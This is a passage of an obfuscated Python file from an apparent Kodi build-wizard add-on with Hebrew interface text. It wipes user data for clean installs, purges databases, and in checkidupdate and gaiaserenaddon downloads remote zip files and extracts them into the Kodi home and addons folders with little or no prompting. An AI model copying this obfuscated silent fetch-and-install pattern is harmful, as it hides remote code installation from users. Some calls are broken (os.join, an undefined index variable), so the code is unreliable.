				elif O0O0OOO000000000O =='favourites.xml'and OOOOOOO00OO000000 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4686
				elif O0O0OOO000000000O =='guisettings.xml'and OOOOOOO00OO000000 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4688
				elif O0O0OOO000000000O =='profiles.xml'and OOOOOOO00OO000000 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4689
				elif O0O0OOO000000000O =='advancedsettings.xml'and OOOOOOO00OO000000 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4690
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4691
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'program.apollo'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4692
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4693
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.video.elementum'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4696
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4697
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4698
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.video.quasar'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4700
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'program.apollo'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4701
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4702
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4703
				elif O0O0OOO000000000O in LOGFILES :wiz .log ("Keep Log File: %s"%O0O0OOO000000000O ,xbmc .LOGNOTICE )#line:4704
				elif O0O0OOO000000000O .endswith ('.db'):#line:4705
					try :#line:4706
						if O0O0OOO000000000O ==O0OOOOO00O0O00OOO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0O0OOO000000000O ,KODIV ),xbmc .LOGNOTICE )#line:4707
						else :os .remove (os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ))#line:4708
					except Exception as O0OO00O0OO0O0OOOO :#line:4709
						if not O0O0OOO000000000O .startswith ('Textures13'):#line:4710
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4711
							wiz .log ("-> %s"%(str (O0OO00O0OO0O0OOOO )),xbmc .LOGNOTICE )#line:4712
							wiz .purgeDb (os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ))#line:4713
				else :#line:4714
					DP .update (int (wiz .percentage (OO000OO0O0000OOO0 ,O0OO00OOOO0O00OOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OOO000000000O ),'')#line:4715
					try :os .remove (os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ))#line:4716
					except Exception as O0OO00O0OO0O0OOOO :#line:4717
						wiz .log ("Error removing %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4718
						wiz .log ("-> / %s"%(str (O0OO00O0OO0O0OOOO )),xbmc .LOGNOTICE )#line:4719
			if DP .iscanceled ():#line:4720
				DP .close ()#line:4721
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4722
				return False #line:4723
		for OO00OO00OO00OOOOO ,OOO0OO000O00OO000 ,O00O0000OOO0OOOO0 in os .walk (O0OO00O00O0O00O0O ,topdown =True ):#line:4724
			OOO0OO000O00OO000 [:]=[OOOOOOOO0000OO000 for OOOOOOOO0000OO000 in OOO0OO000O00OO000 if OOOOOOOO0000OO000 not in EXCLUDES ]#line:4725
			for O0O0OOO000000000O in OOO0OO000O00OO000 :#line:4726
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0OOO000000000O ),'')#line:4727
			  if O0O0OOO000000000O not in ["Database","userdata","temp","addons","addon_data"]:#line:4728
			   if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4729
			    if not (O0O0OOO000000000O =='skin.titan'and KEEPSKIN3 =='true'):#line:4731
			      if not (O0O0OOO000000000O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4732
			       if not (O0O0OOO000000000O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4733
			        if not (O0O0OOO000000000O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4734
			         if not (O0O0OOO000000000O =='program.apollo'and KEEPINFO =='true'):#line:4735
			          if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4736
			            if not (O0O0OOO000000000O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4738
			             if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4739
			              if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4740
			               if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4741
			                if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4742
			                 if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4743
			                  if not (O0O0OOO000000000O =='plugin.video.neptune'and KEEPINFO =='true'):#line:4744
			                   if not (O0O0OOO000000000O =='plugin.video.youtube'and KEEPINFO =='true'):#line:4745
			                    if not (O0O0OOO000000000O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4746
			                     if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4747
			                       if not (O0O0OOO000000000O =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4749
			                           if not (O0O0OOO000000000O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4753
			                            if not (O0O0OOO000000000O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4754
			                             if not (O0O0OOO000000000O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4755
			                              if not (O0O0OOO000000000O =='plugin.video.quasar'and KEEPINFO =='true'):#line:4756
			                               if not (O0O0OOO000000000O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4757
			                                  shutil .rmtree (os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),ignore_errors =True ,onerror =None )#line:4759
			if DP .iscanceled ():#line:4760
				DP .close ()#line:4761
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4762
				return False #line:4763
		DP .close ()#line:4764
		wiz .clearS ('build')#line:4765
		if over ==True :#line:4766
			return True #line:4767
		elif install =='restore':#line:4768
			return True #line:4769
		elif install :#line:4770
			buildWizard (install ,'normal',over =True )#line:4771
		else :#line:4772
			if INSTALLMETHOD ==1 :O0OOO00O00OOOO0OO =1 #line:4773
			elif INSTALLMETHOD ==2 :O0OOO00O00OOOO0OO =0 #line:4774
			else :O0OOO00O00OOOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4775
			if O0OOO00O00OOOO0OO ==1 :wiz .reloadFix ('fresh')#line:4776
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4777
	else :#line:4778
		if not install =='restore':#line:4779
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4780
			wiz .refresh ()#line:4781
def clearCache ():#line:4786
		wiz .clearCache ()#line:4787
def fixwizard ():#line:4791
		wiz .fixwizard ()#line:4792
def totalClean ():#line:4794
		wiz .clearCache ()#line:4796
		wiz .clearPackages ('total')#line:4797
		clearThumb ('total')#line:4798
		cleanfornewbuild ()#line:4799
def cleanfornewbuild ():#line:4800
		try :#line:4801
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4802
		except :#line:4803
			pass #line:4804
		try :#line:4805
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4806
		except :#line:4807
			pass #line:4808
		try :#line:4809
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4810
		except :#line:4811
			pass #line:4812
def clearThumb (type =None ):#line:4813
	O000OOOO0000O0O00 =wiz .latestDB ('Textures')#line:4814
	if not type ==None :O0O0OOO00OOOO000O =1 #line:4815
	else :O0O0OOO00OOOO000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O000OOOO0000O0O00 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4816
	if O0O0OOO00OOOO000O ==1 :#line:4817
		try :wiz .removeFile (os .join (DATABASE ,O000OOOO0000O0O00 ))#line:4818
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O000OOOO0000O0O00 )#line:4819
		wiz .removeFolder (THUMBS )#line:4820
	else :wiz .log ('Clear thumbnames cancelled')#line:4822
	wiz .redoThumbs ()#line:4823
def purgeDb ():#line:4825
	O0OOOOOOOOO00O0OO =[];OOO00O0O0O00O0OO0 =[]#line:4826
	for OO000OO0OO0O000OO ,OO0O0O00OO000O00O ,O000O00OOO000OO0O in os .walk (HOME ):#line:4827
		for O0O00OOO0OOOOO0O0 in fnmatch .filter (O000O00OOO000OO0O ,'*.db'):#line:4828
			if O0O00OOO0OOOOO0O0 !='Thumbs.db':#line:4829
				OO00O0000OO0OO0OO =os .path .join (OO000OO0OO0O000OO ,O0O00OOO0OOOOO0O0 )#line:4830
				O0OOOOOOOOO00O0OO .append (OO00O0000OO0OO0OO )#line:4831
				OOO000OOO0O000OO0 =OO00O0000OO0OO0OO .replace ('\\','/').split ('/')#line:4832
				OOO00O0O0O00O0OO0 .append ('(%s) %s'%(OOO000OOO0O000OO0 [len (OOO000OOO0O000OO0 )-2 ],OOO000OOO0O000OO0 [len (OOO000OOO0O000OO0 )-1 ]))#line:4833
	if KODIV >=16 :#line:4834
		O0OOO00OOO00O0OOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOO00O0O0O00O0OO0 )#line:4835
		if O0OOO00OOO00O0OOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4836
		elif len (O0OOO00OOO00O0OOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4837
		else :#line:4838
			for OO000OOO00OO0O0OO in O0OOO00OOO00O0OOO :wiz .purgeDb (O0OOOOOOOOO00O0OO [OO000OOO00OO0O0OO ])#line:4839
	else :#line:4840
		O0OOO00OOO00O0OOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOO00O0O0O00O0OO0 )#line:4841
		if O0OOO00OOO00O0OOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4842
		else :wiz .purgeDb (O0OOOOOOOOO00O0OO [OO000OOO00OO0O0OO ])#line:4843
def fastupdatefirstbuild (OO0O0O0O0000OO00O ):#line:4849
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4850
	if ENABLE =='Yes':#line:4851
		if not NOTIFY =='true':#line:4852
			O0000O000O0OOO000 =wiz .workingURL (NOTIFICATION )#line:4853
			if O0000O000O0OOO000 ==True :#line:4854
				OO0OO0OO0O000OOO0 ,OO00000O00O00OOOO =wiz .splitNotify (NOTIFICATION )#line:4855
				if not OO0OO0OO0O000OOO0 ==False :#line:4857
					try :#line:4858
						OO0OO0OO0O000OOO0 =int (OO0OO0OO0O000OOO0 );OO0O0O0O0000OO00O =int (OO0O0O0O0000OO00O )#line:4859
						checkidupdate ()#line:4860
						wiz .setS ("notedismiss","true")#line:4861
						if OO0OO0OO0O000OOO0 ==OO0O0O0O0000OO00O :#line:4862
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0OO0OO0O000OOO0 ),xbmc .LOGNOTICE )#line:4863
						elif OO0OO0OO0O000OOO0 >OO0O0O0O0000OO00O :#line:4865
							wiz .log ("[Notifications] id: %s"%str (OO0OO0OO0O000OOO0 ),xbmc .LOGNOTICE )#line:4866
							wiz .setS ('noteid',str (OO0OO0OO0O000OOO0 ))#line:4867
							wiz .setS ("notedismiss","true")#line:4868
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4871
					except Exception as O0O0OO0000000O0OO :#line:4872
						wiz .log ("Error on Notifications Window: %s"%str (O0O0OO0000000O0OO ),xbmc .LOGERROR )#line:4873
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4875
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0000O000O0OOO000 ),xbmc .LOGNOTICE )#line:4876
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4877
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4878
def checkidupdate ():#line:4884
				wiz .setS ("notedismiss","true")#line:4886
				OO00O0OO00OO0O0OO =wiz .workingURL (NOTIFICATION )#line:4887
				OOO0000OO0OOO00O0 =" Kodi Premium"#line:4889
				O00OO00O0OO0OOOO0 =wiz .checkBuild (OOO0000OO0OOO00O0 ,'gui')#line:4890
				OOO0OOO0O0O0OO0O0 =OOO0000OO0OOO00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4891
				if not wiz .workingURL (O00OO00O0OO0OOOO0 )==True :return #line:4892
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4893
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO0000OO0OOO00O0 ),'','אנא המתן')#line:4894
				OOOOOO00O0000O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0OOO0O0O0OO0O0 )#line:4895
				try :os .remove (OOOOOO00O0000O0O0 )#line:4896
				except :pass #line:4897
				logging .warning (O00OO00O0OO0OOOO0 )#line:4898
				if 'google'in O00OO00O0OO0OOOO0 :#line:4899
				   OO0OO0OOOO00OOO0O =googledrive_download (O00OO00O0OO0OOOO0 ,OOOOOO00O0000O0O0 ,DP ,wiz .checkBuild (OOO0000OO0OOO00O0 ,'filesize'))#line:4900
				else :#line:4903
				  downloader .download (O00OO00O0OO0OOOO0 ,OOOOOO00O0000O0O0 ,DP )#line:4904
				xbmc .sleep (100 )#line:4905
				OO000OO00OOO0OO0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0000OO0OOO00O0 )#line:4906
				DP .update (0 ,OO000OO00OOO0OO0O ,'','אנא המתן')#line:4907
				extract .all (OOOOOO00O0000O0O0 ,HOME ,DP ,title =OO000OO00OOO0OO0O )#line:4908
				DP .close ()#line:4909
				wiz .defaultSkin ()#line:4910
				wiz .lookandFeelData ('save')#line:4911
				if KODIV >=18 :#line:4912
					skindialogsettind18 ()#line:4913
				if INSTALLMETHOD ==1 :OO0000OO000OOOO0O =1 #line:4916
				elif INSTALLMETHOD ==2 :OO0000OO000OOOO0O =0 #line:4917
				else :DP .close ()#line:4918
def gaiaserenaddon ():#line:4920
  O000O0OOO0OOOO00O =(ADDON .getSetting ("gaiaseren"))#line:4921
  OOO0O00OOO000OOOO =(ADDON .getSetting ("rdbuild"))#line:4922
  if O000O0OOO0OOOO00O =='true'and OOO0O00OOO000OOOO =='true':#line:4923
    O0OO0OO00O0O0OOOO =(NEWFASTUPDATE )#line:4924
    OO00OO00O0OO000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4925
    OOO00000O0000000O =xbmcgui .DialogProgress ()#line:4926
    OOO00000O0000000O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4927
    OOOOO00000O0000O0 =os .path .join (PACKAGES ,'isr.zip')#line:4928
    OO0OOOOO0OO0OOO00 =urllib2 .Request (O0OO0OO00O0O0OOOO )#line:4929
    OOO0O0000OO00OO0O =urllib2 .urlopen (OO0OOOOO0OO0OOO00 )#line:4930
    OOOO0O0O0OOO0OOO0 =xbmcgui .DialogProgress ()#line:4932
    OOOO0O0O0OOO0OOO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4933
    OOOO0O0O0OOO0OOO0 .update (0 )#line:4934
    O000OOOOO00OO0O00 =open (OOOOO00000O0000O0 ,'wb')#line:4936
    try :#line:4938
      OO00O00OO0OO00000 =OOO0O0000OO00OO0O .info ().getheader ('Content-Length').strip ()#line:4939
      OO00000OOO00O000O =True #line:4940
    except AttributeError :#line:4941
          OO00000OOO00O000O =False #line:4942
    if OO00000OOO00O000O :#line:4944
          OO00O00OO0OO00000 =int (OO00O00OO0OO00000 )#line:4945
    O000O0O0O0O0OO0OO =0 #line:4947
    O0O0OOOO0O0000000 =time .time ()#line:4948
    while True :#line:4949
          OOO0O0O000O00O00O =OOO0O0000OO00OO0O .read (8192 )#line:4950
          if not OOO0O0O000O00O00O :#line:4951
              sys .stdout .write ('\n')#line:4952
              break #line:4953
          O000O0O0O0O0OO0OO +=len (OOO0O0O000O00O00O )#line:4955
          O000OOOOO00OO0O00 .write (OOO0O0O000O00O00O )#line:4956
          if not OO00000OOO00O000O :#line:4958
              OO00O00OO0OO00000 =O000O0O0O0O0OO0OO #line:4959
          if OOOO0O0O0OOO0OOO0 .iscanceled ():#line:4960
             OOOO0O0O0OOO0OOO0 .close ()#line:4961
             try :#line:4962
              os .remove (OOOOO00000O0000O0 )#line:4963
             except :#line:4964
              pass #line:4965
             break #line:4966
          O0OO0OOO0O000O000 =float (O000O0O0O0O0OO0OO )/OO00O00OO0OO00000 #line:4967
          O0OO0OOO0O000O000 =round (O0OO0OOO0O000O000 *100 ,2 )#line:4968
          O0OOOOOO00O0OOOOO =O000O0O0O0O0OO0OO /(1024 *1024 )#line:4969
          O00000O00O0OO0O00 =OO00O00OO0OO00000 /(1024 *1024 )#line:4970
          OOO00OO00OO00O000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOOOO00O0OOOOO ,'teal',O00000O00O0OO0O00 )#line:4971
          if (time .time ()-O0O0OOOO0O0000000 )>0 :#line:4972
            O0O0O00O00OO000O0 =O000O0O0O0O0OO0OO /(time .time ()-O0O0OOOO0O0000000 )#line:4973
            O0O0O00O00OO000O0 =O0O0O00O00OO000O0 /1024 #line:4974
          else :#line:4975
           O0O0O00O00OO000O0 =0 #line:4976
          OOOO00000O00OO0O0 ='KB'#line:4977
          if O0O0O00O00OO000O0 >=1024 :#line:4978
             O0O0O00O00OO000O0 =O0O0O00O00OO000O0 /1024 #line:4979
             OOOO00000O00OO0O0 ='MB'#line:4980
          if O0O0O00O00OO000O0 >0 and not O0OO0OOO0O000O000 ==100 :#line:4981
              O0O0OO00000OOOO0O =(OO00O00OO0OO00000 -O000O0O0O0O0OO0OO )/O0O0O00O00OO000O0 #line:4982
          else :#line:4983
              O0O0OO00000OOOO0O =0 #line:4984
          O00O00OOOOO0OO0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0O00O00OO000O0 ,OOOO00000O00OO0O0 )#line:4985
          OOOO0O0O0OOO0OOO0 .update (int (O0OO0OOO0O000O000 ),OOO00OO00OO00O000 ,O00O00OOOOO0OO0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4987
    OOO00O000000O0O00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4990
    O000OOOOO00OO0O00 .close ()#line:4993
    extract .all (OOOOO00000O0000O0 ,OOO00O000000O0O00 ,OOOO0O0O0OOO0OOO0 )#line:4994
    try :#line:4998
      os .remove (OOOOO00000O0000O0 )#line:4999
    except :#line:5000
      pass #line:5001
def testnotify ():#line:5003
	O0OO00O00OO000O00 =wiz .workingURL (NOTIFICATION )#line:5004
	if O0OO00O00OO000O00 ==True :#line:5005
		try :#line:5006
			O000OO0O0OOOO0O00 ,O0O0OO0OO00OOO0O0 =wiz .splitNotify (NOTIFICATION )#line:5007
			if O000OO0O0OOOO0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5008
			if STARTP2 ()=='ok':#line:5009
				notify .notification (O0O0OO0OO00OOO0O0 ,True )#line:5010
		except Exception as OOO000O00OOO0OO00 :#line:5011
			wiz .log ("Error on Notifications Window: %s"%str (OOO000O00OOO0OO00 ),xbmc .LOGERROR )#line:5012
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5013
def testnotify2 ():#line:5014
	OOOO0OO0O0O00OOOO =wiz .workingURL (NOTIFICATION2 )#line:5015
	if OOOO0OO0O0O00OOOO ==True :#line:5016
		try :#line:5017
			OOO00000000OOO0O0 ,O00O00O000O0OOO00 =wiz .splitNotify (NOTIFICATION2 )#line:5018
			if OOO00000000OOO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5019
			if STARTP2 ()=='ok':#line:5020
				notify .notification2 (O00O00O000O0OOO00 ,True )#line:5021
		except Exception as O00O0O0OOOOOO00OO :#line:5022
			wiz .log ("Error on Notifications Window: %s"%str (O00O0O0OOOOOO00OO ),xbmc .LOGERROR )#line:5023
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5024
def testnotify3 ():#line:5025
	OOO0O0OOOO000O000 =wiz .workingURL (NOTIFICATION3 )#line:5026
	if OOO0O0OOOO000O000 ==True :#line:5027
		try :#line:5028
			O00O0000O0OOOOOO0 ,OO00OOOOO000O0OOO =wiz .splitNotify (NOTIFICATION3 )#line:5029
			if O00O0000O0OOOOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5030
			if STARTP2 ()=='ok':#line:5031
				notify .notification3 (OO00OOOOO000O0OOO ,True )#line:5032
		except Exception as O00O0O0O000O0OOOO :#line:5033
			wiz .log ("Error on Notifications Window: %s"%str (O00O0O0O000O0OOOO ),xbmc .LOGERROR )#line:5034
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5035
def servicemanual ():#line:5036
	O0OO00O0O0O0O00OO =wiz .workingURL (HELPINFO )#line:5037
	if O0OO00O0O0O0O00OO ==True :#line:5038
		try :#line:5039
			OOO00O0OOO0O0O000 ,OO0O0O00OO0O00O0O =wiz .splitNotify (HELPINFO )#line:5040
			if OOO00O0OOO0O0O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5041
			notify .helpinfo (OO0O0O00OO0O00O0O ,True )#line:5042
		except Exception as OO0000OOO00O0000O :#line:5043
			wiz .log ("Error on Notifications Window: %s"%str (OO0000OOO00O0000O ),xbmc .LOGERROR )#line:5044
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5045
def testupdate ():#line:5047
	if BUILDNAME =="":#line:5048
		notify .updateWindow ()#line:5049
	else :#line:5050
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5051
def testfirst ():#line:5053
	notify .firstRun ()#line:5054
def testfirstRun ():#line:5056
	notify .firstRunSettings ()#line:5057
def fastinstall ():#line:5060
	notify .firstRuninstall ()#line:5061
def addDir (O0OO0OO0OOO0000OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5068
	O0O0O00OO0OO00O00 =sys .argv [0 ]#line:5069
	if not mode ==None :O0O0O00OO0OO00O00 +="?mode=%s"%urllib .quote_plus (mode )#line:5070
